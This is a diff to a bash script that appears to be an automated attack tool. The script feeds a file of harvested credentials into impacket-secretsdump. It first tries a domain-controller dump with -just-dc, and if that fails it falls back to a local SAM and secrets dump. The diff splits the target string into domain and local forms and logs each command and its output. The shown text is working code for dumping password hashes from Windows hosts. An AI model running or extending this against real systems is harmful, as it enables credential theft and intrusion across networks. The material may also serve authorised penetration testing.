@@ -656,21 +656,21 @@ if [[ -s "$FINAL_CREDS_FILE" ]]; then
         # -----------------------------------------------------------
         # BUILD TARGET STRING
         # -----------------------------------------------------------
-        if [[ "$DOMAIN" == "WORKGROUP" ]]; then
-            TARGET_STRING="$cred_user:$cred_pass@$ip"
-        else
-            TARGET_STRING="$DOMAIN/$cred_user:$cred_pass@$ip"
+        DOMAIN_TARGET=""
+        if [[ "$DOMAIN" != "WORKGROUP" && "$DOMAIN" != "." ]]; then
+            DOMAIN_TARGET="$DOMAIN/$cred_user:$cred_pass@$ip"
         fi
+        LOCAL_TARGET="$cred_user:$cred_pass@$ip"
 
         # -----------------------------------------------------------
         # STEP 1 : JUST-DC
         # -----------------------------------------------------------
-        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$TARGET_STRING\" -outputfile \"$dump_out_name\"${NC}"
+        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$DOMAIN_TARGET\" -outputfile \"$dump_out_name\"${NC}"
         echo -e "${BLUE}--- SECRETSDUMP JUST-DC OUTPUT ---${NC}"
 
         timeout 120s impacket-secretsdump \
             -just-dc \
-            "$TARGET_STRING" \
+            "$DOMAIN_TARGET" \
             -outputfile "$dump_out_name" \
             2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
 
@@ -688,23 +688,23 @@ if [[ -s "$FINAL_CREDS_FILE" ]]; then
 
         else
 
-            echo -e "${YELLOW}[!] JUST-DC failed, trying full secretsdump...${NC}"
+            echo -e "${YELLOW}[!] JUST-DC failed, trying local secretsdump...${NC}"
 
             # -----------------------------------------------------------
-            # STEP 2 : FULL SECRETSDUMP
+            # STEP 2 : Local SECRETSDUMP
             # -----------------------------------------------------------
-            echo -e "${GRAY}[CMD] timeout 180s impacket-secretsdump \"$TARGET_STRING\" -outputfile \"$dump_out_name\"${NC}"
+            echo -e "${GRAY}[CMD] timeout 180s impacket-secretsdump \"$LOCAL_TARGET\" -outputfile \"$dump_out_name\"${NC}"
             echo -e "${BLUE}--- SECRETSDUMP FULL OUTPUT ---${NC}"
 
             timeout 180s impacket-secretsdump \
-                "$TARGET_STRING" \
+                "$LOCAL_TARGET" \
                 -outputfile "$dump_out_name" \
                 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
 
             echo -e "${BLUE}--------------------------------${NC}"
 
             # -----------------------------------------------------------
-            # SUCCESS FULL DUMP
+            # SUCCESS Local DUMP
             # -----------------------------------------------------------
             if [[ -s "${dump_out_name}.sam" || -s "${dump_out_name}.secrets" ]]; then
 
